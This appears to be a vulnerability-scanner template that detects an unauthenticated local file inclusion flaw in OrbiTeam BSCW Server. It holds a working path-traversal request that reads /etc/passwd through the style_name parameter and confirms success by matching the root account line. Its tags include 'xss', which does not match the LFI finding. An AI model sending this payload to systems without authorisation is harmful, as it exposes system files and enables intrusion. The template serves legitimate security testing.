id: orbiteam-bscw-server-lfi
name: OrbiTeam BSCW Server - Local File Inclusion
severity: high
confidence: tentative
description: OrbiTeam BSCW Server versions 5.0.x, 5.1.x, 5.2.4 and below, 7.3.x and below, and 7.4.3 and below are vulnerable
  to unauthenticated local file inclusion.
reference: CWE-22
tags:
- bscw
- orbiteam
- lfi
- unauth
- packetstorm
- xss
- vuln
requests:
- method: GET
  path: /pub/bscw.cgi/30?op=theme&style_name=../../../../../../../../etc/passwd
  matchers:
  - type: regex
    regex:
    - root:[x*]:0:0
  - type: status
    status:
    - 200
  condition: and
